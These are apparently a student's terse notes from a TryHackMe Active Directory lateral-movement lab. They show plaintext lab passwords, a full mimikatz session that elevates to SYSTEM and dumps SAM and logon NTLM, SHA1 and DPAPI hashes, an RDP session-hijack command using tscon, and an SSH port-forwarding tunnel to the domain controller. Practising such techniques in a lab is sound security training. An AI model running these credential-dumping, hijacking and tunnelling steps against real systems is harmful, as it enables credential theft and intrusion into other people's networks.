
> [!NOTE] Issued Creds
> barbara.taylor Password: Knockers2015?
> t2_abigail.cox Password: Vivian2008

### Pass The 

```powershell
PS C:\tools> .\mimikatz.exe                                                                                                                                 
                                                                                                                                                            
  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53                                                                                                
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                                                                                                                 
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )                                                                                    
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz                                                                                                     
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )                                                                                   
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/                                                                                   
                                                                                                                                                            
mimikatz # privilege::debug                                                                                                                                 
Privilege '20' OK                                                                                                                                           
                                                                                                                                                            
mimikatz # token::elevate                                                                                                                                   
Token Id  : 0                                                                                                                                               
User name :                                                                                                                                                 
SID name  : NT AUTHORITY\SYSTEM                                                                                                                             
                                                                                                                                                            
512     {0;000003e7} 1 D 17064          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary                                                     
 -> Impersonated !                                                                                                                                          
 * Process Token : {0;0016361b} 0 D 1550555     ZA\t2_felicia.dean      S-1-5-21-3330634377-1326264276-632209373-4605   (12g,24p                            
)       Primary                                                                                                                                             
 * Thread Token  : {0;000003e7} 1 D 1644076     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegatio                            
n)                                                                                                        
mimikatz # lsadump::sam                                                                                                                                     
Domain : THMJMP2                                                                                                                                            
SysKey : 2e27b23479e1fb1161a839f9800119eb                                                                                                                   
Local SID : S-1-5-21-1946626518-647761240-1897539217                             
SAMKey : 9a74a253f756d6b012b7ee3d0436f77a                                                                                                                   
RID  : 000001f4 (500)                                                                                                                           
User : Administrator                                                                                                                                  
  Hash NTLM: 0b2571be7e75e3dbd169ca5352a2dad7                                                                                                         
RID  : 000001f5 (501)                                                                                                                                       
User : Guest                                                                                                                                  
RID  : 000001f7 (503)                                                                                                                                       
User : DefaultAccount 


                                                                                                                                                            
Authentication Id : 0 ; 1455643 (00000000:0016361b)                                                                                                         
Session           : NetworkCleartext from 0                                                                                                                 
User Name         : t2_felicia.dean                                                                                                                         
Domain            : ZA                                                                                                                                      
Logon Server      : THMDC                                                                                                                                   
Logon Time        : 8/14/2024 12:28:09 PM                                                                                                                   
SID               : S-1-5-21-3330634377-1326264276-632209373-4605                                                                                           
        msv :                                                                                                                                               
         [00000003] Primary                                                                                                                                 
         * Username : t2_felicia.dean                                                                                                                       
         * Domain   : ZA                                                                                                                                    
         * NTLM     : 7806fea66c81806b5dc068484b4567f6                                                                                                      
         * SHA1     : b5c06a36f629a624e4adce09bd59e5f99c90a9a7                                                                                              
         * DPAPI    : e375158311db4a6357c3e3921cd42e7e                                                                                                      
                                                                                                                                                            
Authentication Id : 0 ; 1454530 (00000000:001631c2)                                                                                                         
Session           : Service from 0                                                                                                                          
User Name         : sshd_11164                                                                                                                              
Domain            : VIRTUAL USERS                                                                                                                           
Logon Server      : (null)                                                                                                                                  
Logon Time        : 8/14/2024 12:27:59 PM                                                                                                                   
SID               : S-1-5-111-3847866527-469524349-687026318-516638107-1125189541-11164                                                                     
        msv :                                                                                                                                               
         [00000003] Primary                                                                                                                                 
         * Username : THMJMP2$                                                                                                                              
         * Domain   : ZA                                                                                                                                    
         * NTLM     : 0cadd800f897d25f84484b9224bd7901                                                                                                      
         * SHA1     : 5a0d94164cfd834fb8d87f1de2a490c507f2d324                                                                                              
                                                                                                                                                            
Authentication Id : 0 ; 1096871 (00000000:0010bca7)                                                                                                         
Session           : Interactive from 7                                                                                                                      
User Name         : DWM-7                                                                                                                                   
Domain            : Window Manager                                                                                                                          
Logon Server      : (null)                                                                                                                                  
Logon Time        : 8/14/2024 12:19:44 PM                                                                                                                   
SID               : S-1-5-90-0-7                                                                                                                            
        msv :                                                                                                                                               
         [00000003] Primary                                                                                                                                 
         * Username : THMJMP2$                                                                                                                              
         * Domain   : ZA                                                                                                                                    
         * NTLM     : 0cadd800f897d25f84484b9224bd7901                                                                                                      
         * SHA1     : 5a0d94164cfd834fb8d87f1de2a490c507f2d324                                                                                              
                                                                                                                                                            
Authentication Id : 0 ; 921450 (00000000:000e0f6a)                                                                                                          
Session           : Interactive from 6                                                                                                                      
User Name         : DWM-6                                                                                                                                   
Domain            : Window Manager                                                                                                                          
Logon Server      : (null)                                                                                                                                  
Logon Time        : 8/14/2024 12:19:33 PM                                                                                                                   
SID               : S-1-5-90-0-6                                                                                                                            
        msv :                                                                                                                                               
         [00000003] Primary                                                                                                                                 
         * Username : THMJMP2$                                                                                                                              
         * Domain   : ZA                                                                                                                                    
         * NTLM     : 0cadd800f897d25f84484b9224bd7901                                                                                                      
         * SHA1     : 5a0d94164cfd834fb8d87f1de2a490c507f2d324                                                                                              
                                                                                                                                                            
Authentication Id : 0 ; 921430 (00000000:000e0f56)                                                                                                          
Session           : Interactive from 6                                                                                                                      
User Name         : DWM-6                                                                                                                                   
Domain            : Window Manager                                                                                                                          
Logon Server      : (null)                                                                                                                                  
Logon Time        : 8/14/2024 12:19:33 PM                                                                                                                   
SID               : S-1-5-90-0-6                                                                                                                            
        msv :                                                                                                                                               
         [00000003] Primary                                                                                                                                 
         * Username : THMJMP2$                                                                                                                              
         * Domain   : ZA                                                                                                                                    
         * NTLM     : 0cadd800f897d25f84484b9224bd7901                                                                                                      
         * SHA1     : 5a0d94164cfd834fb8d87f1de2a490c507f2d324                                                                                              
                                                                                                                                                            
Authentication Id : 0 ; 798969 (00000000:000c30f9)                                                                                                          
Session           : RemoteInteractive from 5                                                                                                                
User Name         : t1_toby.beck2                                                                                                                           
Domain            : ZA                                                                                                                                      
Logon Server      : THMDC                                                                                                                                   
Logon Time        : 8/14/2024 12:19:22 PM                                                                                                                   
SID               : S-1-5-21-3330634377-1326264276-632209373-4617                                                                                           
        msv :                                                                                                                                               
         [00000003] Primary                                                                                                                                 
         * Username : t1_toby.beck2                                                                                                                         
         * Domain   : ZA                                                                                                                                    
         * NTLM     : 533f1bd576caa912bdb9da284bbc60fe                                                                                                      
         * SHA1     : 8a65216442debb62a3258eea4fbcbadea40ccc38                                                                                              
         * DPAPI    : 4350e787e87478881a14c357350ffb6e                                                                                                      
                                                                                                                                                            
Authentication Id : 0 ; 793149 (00000000:000c1a3d)                                                                                                          
Session           : Interactive from 5                                                                                                                      
User Name         : DWM-5                                                                                                                                   
Domain            : Window Manager                                                                                                                          
Logon Server      : (null)                                                                                                                                  
Logon Time        : 8/14/2024 12:19:22 PM                                                                                                                   
SID               : S-1-5-90-0-5                                                                                                                            
        msv :                                                                                                                                               
         [00000003] Primary                                                                                                                                 
         * Username : THMJMP2$                                                                                                                              
         * Domain   : ZA                                                                                                                                    
         * NTLM     : 0cadd800f897d25f84484b9224bd7901                                                                                                      
         * SHA1     : 5a0d94164cfd834fb8d87f1de2a490c507f2d324                                                                                              
                                                                                                                                                            
Authentication Id : 0 ; 707197 (00000000:000aca7d)                                                                                                          
Session           : RemoteInteractive from 4                                                                                                                
User Name         : t1_toby.beck1                                                                                                                           
Domain            : ZA                                                                                                                                      
Logon Server      : THMDC                                                                                                                                   
Logon Time        : 8/14/2024 12:19:12 PM                                                                                                                   
SID               : S-1-5-21-3330634377-1326264276-632209373-4616                                                                                           
        msv :                                                                                                                                               
         [00000003] Primary                                                                                                                                 
         * Username : t1_toby.beck1                                                                                                                         
         * Domain   : ZA                                                                                                                                    
         * NTLM     : 533f1bd576caa912bdb9da284bbc60fe                                                                                                      
         * SHA1     : 8a65216442debb62a3258eea4fbcbadea40ccc38                                                                                              
         * DPAPI    : 489fed8eeb5acc4ffb205663491b62d3                                                                                                      
                                                                                                                                                            
Authentication Id : 0 ; 701386 (00000000:000ab3ca)                                                                                                          
Session           : Interactive from 4                                                                                                                      
User Name         : DWM-4                                                                                                                                   
Domain            : Window Manager                                                                                                                          
Logon Server      : (null)                                                                                                                                  
Logon Time        : 8/14/2024 12:19:11 PM                                                                                                                   
SID               : S-1-5-90-0-4                                                                                                                            
        msv :                                                                                                                                               
         [00000003] Primary                                                                                                                                 
         * Username : THMJMP2$                                                                                                                              
         * Domain   : ZA                                                                                                                                    
         * NTLM     : 0cadd800f897d25f84484b9224bd7901                                                                                                      
         * SHA1     : 5a0d94164cfd834fb8d87f1de2a490c507f2d324                                                                                              
                                                                                                                                                            
Authentication Id : 0 ; 586789 (00000000:0008f425)                                                                                                          
Session           : Interactive from 3                                                                                                                      
User Name         : DWM-3                                                                                                                                   
Domain            : Window Manager                                                                                                                          
Logon Server      : (null)                                                                                                                                  
Logon Time        : 8/14/2024 12:19:01 PM                                                                                                                   
SID               : S-1-5-90-0-3                                                                                                                            
        msv :                                                                                                                                               
         [00000003] Primary                                                                                                                                 
         * Username : THMJMP2$                                                                                                                              
         * Domain   : ZA                                                                                                                                    
         * NTLM     : 0cadd800f897d25f84484b9224bd7901                                                                                                      
         * SHA1     : 5a0d94164cfd834fb8d87f1de2a490c507f2d324                                                                                              
                                                                                                                                                            
Authentication Id : 0 ; 294396 (00000000:00047dfc)                                                                                                          
Session           : Interactive from 2                                                                                                                      
User Name         : DWM-2                                                                                                                                   
Domain            : Window Manager                                                                                                                          
Logon Server      : (null)                                                                                                                                  
Logon Time        : 8/14/2024 12:10:09 PM                                                                                                                   
SID               : S-1-5-90-0-2                                                                                                                            
        msv :                                                                                                                                               
         [00000003] Primary                                                                                                                                 
         * Username : THMJMP2$                                                                                                                              
         * Domain   : ZA                                                                                                                                    
         * NTLM     : 0cadd800f897d25f84484b9224bd7901                                                                                                      
         * SHA1     : 5a0d94164cfd834fb8d87f1de2a490c507f2d324                                                                                              
                                                                                                                                                            
Authentication Id : 0 ; 108114 (00000000:0001a652)                                                                                                          
Session           : Service from 0                                                                                                                          
User Name         : MSSQL$MICROSOFT##WID                                                                                                                    
Domain            : NT SERVICE                                                                                                                              
Logon Server      : (null)                                                                                                                                  
Logon Time        : 8/14/2024 12:08:32 PM                                                                                                                   
SID               : S-1-5-80-1184457765-4068085190-3456807688-2200952327-3769537534                                                                         
        msv :                                                                                                                                               
         [00000003] Primary                                                                                                                                 
         * Username : THMJMP2$                                                                                                                              
         * Domain   : ZA                                                                                                                                    
         * NTLM     : 0cadd800f897d25f84484b9224bd7901                                                                                                      
         * SHA1     : 5a0d94164cfd834fb8d87f1de2a490c507f2d324                                                                                              
                                                                                                                                                            
Authentication Id : 0 ; 42633 (00000000:0000a689)                                                                                                           
Session           : Interactive from 1                                                                                                                      
User Name         : DWM-1                                                                                                                                   
Domain            : Window Manager                                                                                                                          
Logon Server      : (null)                                                                                                                                  
Logon Time        : 8/14/2024 12:08:30 PM                                                                                                                   
SID               : S-1-5-90-0-1                                                                                                                            
        msv :                                                                                                                                               
         [00000003] Primary                                                                                                                                 
         * Username : THMJMP2$                                                                                                                              
         * Domain   : ZA                                                                                                                                    
         * NTLM     : 0cadd800f897d25f84484b9224bd7901                                                                                                      
         * SHA1     : 5a0d94164cfd834fb8d87f1de2a490c507f2d324                                                                                              
                                                                                                                                                            
Authentication Id : 0 ; 42579 (00000000:0000a653)                                                                                                           
Session           : Interactive from 1                                                                                                                      
User Name         : DWM-1                                                                                                                                   
Domain            : Window Manager                                                                                                                          
Logon Server      : (null)                                                                                                                                  
Logon Time        : 8/14/2024 12:08:30 PM                                                                                                                   
SID               : S-1-5-90-0-1                                                                                                                            
        msv :                                                                                                                                               
         [00000003] Primary                                                                                                                                 
         * Username : THMJMP2$                                                                                                                              
         * Domain   : ZA                                                                                                                                    
         * NTLM     : 0cadd800f897d25f84484b9224bd7901                                                                                                      
         * SHA1     : 5a0d94164cfd834fb8d87f1de2a490c507f2d324                                                                                              
                                                                                                                                                            
Authentication Id : 0 ; 996 (00000000:000003e4)                                                                                                             
Session           : Service from 0                                                                                                                          
User Name         : THMJMP2$                                                                                                                                
Domain            : ZA                                                                                                                                      
Logon Server      : (null)                                                                                                                                  
Logon Time        : 8/14/2024 12:08:30 PM                                                                                                                   
SID               : S-1-5-20                                                                                                                                
        msv :                                                                                                                                               
         [00000003] Primary                                                                                                                                 
         * Username : THMJMP2$                                                                                                                              
         * Domain   : ZA                                                                                                                                    
         * NTLM     : 0cadd800f897d25f84484b9224bd7901                                                                                                      
         * SHA1     : 5a0d94164cfd834fb8d87f1de2a490c507f2d324                                                                                              
                                                                                                                                                            
Authentication Id : 0 ; 22282 (00000000:0000570a)                                                                                                           
Session           : UndefinedLogonType from 0                                                                                                               
User Name         : (null)                                                                                                                                  
Domain            : (null)                                                                                                                                  
Logon Server      : (null)                                                                                                                                  
Logon Time        : 8/14/2024 12:08:30 PM                                                                                                                   
SID               :                                                                                                                                         
        msv :                                                                                                                                               
         [00000003] Primary                                                                                                                                 
         * Username : THMJMP2$                                                                                                                              
         * Domain   : ZA                                                                                                                                    
         * NTLM     : 0cadd800f897d25f84484b9224bd7901                                                                                                      
         * SHA1     : 5a0d94164cfd834fb8d87f1de2a490c507f2d324                                                                                              
                                                                                                                                                            
Authentication Id : 0 ; 1104291 (00000000:0010d9a3)                                                                                                         
Session           : RemoteInteractive from 7                                                                                                                
User Name         : t1_toby.beck4                                                                                                                           
Domain            : ZA                                                                                                                                      
Logon Server      : THMDC                                                                                                                                   
Logon Time        : 8/14/2024 12:19:44 PM                                                                                                                   
SID               : S-1-5-21-3330634377-1326264276-632209373-4619                                                                                           
        msv :                                                                                                                                               
         [00000003] Primary                                                                                                                                 
         * Username : t1_toby.beck4                                                                                                                         
         * Domain   : ZA                                                                                                                                    
         * NTLM     : 533f1bd576caa912bdb9da284bbc60fe                                                                                                      
         * SHA1     : 8a65216442debb62a3258eea4fbcbadea40ccc38                                                                                              
         * DPAPI    : 47d511de8e208dc0053e88223dcdd31c                                                                                                      
                                                                                                                                                            
Authentication Id : 0 ; 1096918 (00000000:0010bcd6)                                                                                                         
Session           : Interactive from 7                                                                                                                      
User Name         : DWM-7                                                                                                                                   
Domain            : Window Manager                                                                                                                          
Logon Server      : (null)                                                                                                                                  
Logon Time        : 8/14/2024 12:19:44 PM                                                                                                                   
SID               : S-1-5-90-0-7                                                                                                                            
        msv :                                                                                                                                               
         [00000003] Primary                                                                                                                                 
         * Username : THMJMP2$                                                                                                                              
         * Domain   : ZA                                                                                                                                    
         * NTLM     : 0cadd800f897d25f84484b9224bd7901                                                                                                      
         * SHA1     : 5a0d94164cfd834fb8d87f1de2a490c507f2d324                                                                                              
                                                                                                                                                            
Authentication Id : 0 ; 928111 (00000000:000e296f)                                                                                                          
Session           : RemoteInteractive from 6                                                                                                                
User Name         : t1_toby.beck3                                                                                                                           
Domain            : ZA                                                                                                                                      
Logon Server      : THMDC                                                                                                                                   
Logon Time        : 8/14/2024 12:19:34 PM                                                                                                                   
SID               : S-1-5-21-3330634377-1326264276-632209373-4618                                                                                           
        msv :                                                                                                                                               
         [00000003] Primary                                                                                                                                 
         * Username : t1_toby.beck3                                                                                                                         
         * Domain   : ZA                                                                                                                                    
         * NTLM     : 533f1bd576caa912bdb9da284bbc60fe                                                                                                      
         * SHA1     : 8a65216442debb62a3258eea4fbcbadea40ccc38                                                                                              
         * DPAPI    : 20fa99221aff152851ce37bcd510e61e                                                                                                      
                                                                                                                                                            
Authentication Id : 0 ; 793124 (00000000:000c1a24)                                                                                                          
Session           : Interactive from 5                                                                                                                      
User Name         : DWM-5                                                                                                                                   
Domain            : Window Manager                                                                                                                          
Logon Server      : (null)                                                                                                                                  
Logon Time        : 8/14/2024 12:19:22 PM                                                                                                                   
SID               : S-1-5-90-0-5                                                                                                                            
        msv :                                                                                                                                               
         [00000003] Primary                                                                                                                                 
         * Username : THMJMP2$                                                                                                                              
         * Domain   : ZA                                                                                                                                    
         * NTLM     : 0cadd800f897d25f84484b9224bd7901                                                                                                      
         * SHA1     : 5a0d94164cfd834fb8d87f1de2a490c507f2d324                                                                                              
                                                                                                                                                            
Authentication Id : 0 ; 701413 (00000000:000ab3e5)                                                                                                          
Session           : Interactive from 4                                                                                                                      
User Name         : DWM-4                                                                                                                                   
Domain            : Window Manager                                                                                                                          
Logon Server      : (null)                                                                                                                                  
Logon Time        : 8/14/2024 12:19:11 PM                                                                                                                   
SID               : S-1-5-90-0-4                                                                                                                            
        msv :                                                                                                                                               
         [00000003] Primary                                                                                                                                 
         * Username : THMJMP2$                                                                                                                              
         * Domain   : ZA                                                                                                                                    
         * NTLM     : 0cadd800f897d25f84484b9224bd7901                                                                                                      
         * SHA1     : 5a0d94164cfd834fb8d87f1de2a490c507f2d324                                                                                              
                                                                                                                                                            
Authentication Id : 0 ; 593451 (00000000:00090e2b)                                                                                                          
Session           : RemoteInteractive from 3                                                                                                                
User Name         : t1_toby.beck                                                                                                                            
Domain            : ZA                                                                                                                                      
Logon Server      : THMDC                                                                                                                                   
Logon Time        : 8/14/2024 12:19:01 PM                                                                                                                   
SID               : S-1-5-21-3330634377-1326264276-632209373-4607                                                                                           
        msv :                                                                                                                                               
         [00000003] Primary                                                                                                                                 
         * Username : t1_toby.beck                                                                                                                          
         * Domain   : ZA                                                                                                                                    
         * NTLM     : 533f1bd576caa912bdb9da284bbc60fe                                                                                                      
         * SHA1     : 8a65216442debb62a3258eea4fbcbadea40ccc38                                                                                              
         * DPAPI    : d9cd92937c7401805389fbb51260c45f                                                                                                      
                                                                                                                                                            
Authentication Id : 0 ; 586814 (00000000:0008f43e)                                                                                                          
Session           : Interactive from 3                                                                                                                      
User Name         : DWM-3                                                                                                                                   
Domain            : Window Manager                                                                                                                          
Logon Server      : (null)                                                                                                                                  
Logon Time        : 8/14/2024 12:19:01 PM                                                                                                                   
SID               : S-1-5-90-0-3                                                                                                                            
        msv :                                                                                                                                               
         [00000003] Primary                                                                                                                                 
         * Username : THMJMP2$                                                                                                                              
         * Domain   : ZA                                                                                                                                    
         * NTLM     : 0cadd800f897d25f84484b9224bd7901                                                                                                      
         * SHA1     : 5a0d94164cfd834fb8d87f1de2a490c507f2d324                                                                                              
                                                                                                                                                            
Authentication Id : 0 ; 310920 (00000000:0004be88)                                                                                                          
Session           : RemoteInteractive from 2                                                                                                                
User Name         : t1_toby.beck5                                                                                                                           
Domain            : ZA                                                                                                                                      
Logon Server      : THMDC                                                                                                                                   
Logon Time        : 8/14/2024 12:10:10 PM                                                                                                                   
SID               : S-1-5-21-3330634377-1326264276-632209373-4620                                                                                           
        msv :                                                                                                                                               
         [00000003] Primary                                                                                                                                 
         * Username : t1_toby.beck5                                                                                                                         
         * Domain   : ZA                                                                                                                                    
         * NTLM     : 533f1bd576caa912bdb9da284bbc60fe                                                                                                      
         * SHA1     : 8a65216442debb62a3258eea4fbcbadea40ccc38                                                                                              
         * DPAPI    : 0537b9105954f5d1d1bc2f1763d86fd6                                                                                                      
                                                                                                                                                            
Authentication Id : 0 ; 294371 (00000000:00047de3)                                                                                                          
Session           : Interactive from 2                                                                                                                      
User Name         : DWM-2                                                                                                                                   
Domain            : Window Manager                                                                                                                          
Logon Server      : (null)                                                                                                                                  
Logon Time        : 8/14/2024 12:10:09 PM                                                                                                                   
SID               : S-1-5-90-0-2                                                                                                                            
        msv :                                                                                                                                               
         [00000003] Primary                                                                                                                                 
         * Username : THMJMP2$                                                                                                                              
         * Domain   : ZA                                                                                                                                    
         * NTLM     : 0cadd800f897d25f84484b9224bd7901                                                                                                      
         * SHA1     : 5a0d94164cfd834fb8d87f1de2a490c507f2d324                                                                                              
                                                                                                                                                            
Authentication Id : 0 ; 995 (00000000:000003e3)                                                                                                             
Session           : Service from 0                                                                                                                          
User Name         : IUSR                                                                                                                                    
Domain            : NT AUTHORITY                                                                                                                            
Logon Server      : (null)                                                                                                                                  
Logon Time        : 8/14/2024 12:08:32 PM                                                                                                                   
SID               : S-1-5-17                                                                                                                                
        msv :                                                                                                                                               
                                                                                                                                                            
Authentication Id : 0 ; 997 (00000000:000003e5)                                                                                                             
Session           : Service from 0                                                                                                                          
User Name         : LOCAL SERVICE                                                                                                                           
Domain            : NT AUTHORITY                                                                                                                            
Logon Server      : (null)                                                                                                                                  
Logon Time        : 8/14/2024 12:08:31 PM                                                                                                                   
SID               : S-1-5-19                                                                                                                                
        msv :                                                                                                                                               
                                                                                                                                                            
Authentication Id : 0 ; 999 (00000000:000003e7)                                                                                                             
Session           : UndefinedLogonType from 0                                                                                                               
User Name         : THMJMP2$                                                                                                                                
Domain            : ZA                                                                                                                                      
Logon Server      : (null)                                                                                                                                  
Logon Time        : 8/14/2024 12:08:29 PM                                                                                                                   
SID               : S-1-5-18                                                                                                                                
        msv :                                                                                                                                               
                
```

### RDP Hijack 
xfreerdp /v:thmjmp2.za.tryhackme.com /u:abigail.cox /p:Vivian2008

`tscon {hijack disc} /dest:{yourrdpsession}#{x}`


C:\> ssh tunneluser@10.50.157.53 -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N
